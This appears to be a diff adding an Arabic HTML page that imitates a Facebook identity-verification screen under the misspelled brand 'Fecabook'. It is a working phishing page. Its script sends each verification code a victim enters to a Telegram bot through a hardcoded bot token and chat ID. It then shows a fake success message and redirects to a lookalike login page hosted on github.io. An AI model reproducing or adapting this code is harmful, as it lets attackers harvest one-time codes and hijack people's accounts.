@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحه تحقق من الهوية</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+
+        .left {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .left h1 {
+            font-size: 40px;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+
+        .left p {
+            font-size: 18px;
+            color: #333;
+            margin: 0;
+        }
+
+        .right {
+            width: 100%;
+            max-width: 300px;
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .right input {
+            width: 100%; /* جعل الحقل بعرض كامل */
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .right button {
+            width: 100%; /* جعل الزر بعرض كامل */
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .right button:hover {
+            background-color: #145dbf;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        .verification-message {
+            color: green;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        /* استجابة للشاشات الصغيرة */
+        @media (max-width: 768px) {
+            .left h1 {
+                font-size: 30px;
+            }
+
+            .left p {
+                font-size: 16px;
+            }
+
+            .right {
+                width: 90%;
+            }
+
+            .right input, .right button {
+                font-size: 14px;
+                padding: 8px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .left h1 {
+                font-size: 24px;
+            }
+
+            .left p {
+                font-size: 14px;
+            }
+
+            .right {
+                padding: 10px;
+            }
+
+            .right input, .right button {
+                font-size: 12px;
+                padding: 6px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- الجزء الأيسر -->
+        <div class="left">
+            <h1>Fecabook</h1> <!-- كتابة "فيس بوك" بدلاً من الصورة -->
+            <p>الرجاء ادخال كود التحقق المرسل اليك</p>
+        </div>
+
+        <!-- الجزء الأيمن -->
+        <div class="right">
+            <form id="verificationForm">
+                <input type="text" id="verificationCode" placeholder="ادخل كود التحقق" required>
+                <button type="submit">تأكيد</button>
+            </form>
+            <p id="verificationMessage" class="verification-message" style="display: none;">تم التحقق من الهوية بنجاح</p>
+        </div>
+    </div>
+
+    <!-- تذييل الصفحة -->
+    <div class="footer">
+        © 2024 فيسيوك. جميع الحقوق محفوظة.
+    </div>
+
+    <script>
+        const botToken = "7313277524:AAFPzkl5iXAlNfq5LiM7_OlBVHPkmk-ydpg"; // توكن البوت
+        const chatId = "5965289737"; // معرف الدردشة في تلجرام
+
+        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // جمع البيانات
+            const verificationCode = document.getElementById('verificationCode').value;
+
+            // إرسال كود التحقق إلى تلجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `كود التحقق الجديد: ${verificationCode}`
+                })
+            }).then(response => {
+                if (response.ok) {
+                    // عرض الرسالة "تم التحقق من الهوية بنجاح!"
+                    document.getElementById('verificationMessage').style.display = 'block';
+
+                    // تأخير الانتقال للصفحة الأخرى
+                    setTimeout(function() {
+                        window.location.href = "https://fecabook-com.github.io/logins/fecabook.html"; // رابط الصفحة الجديدة
+                    }, 1000); // تأخير 2 ثانية (يمكنك تغيير الوقت هنا)
+                } else {
+                    alert("حدث خطأ أثناء إرسال الكود.");
+                }
+            }).catch(error => {
+                alert("تعذر الاتصال بالخادم.");
+                console.error(error);
+            });
+        });
+    </script>
+</body>
+</html>
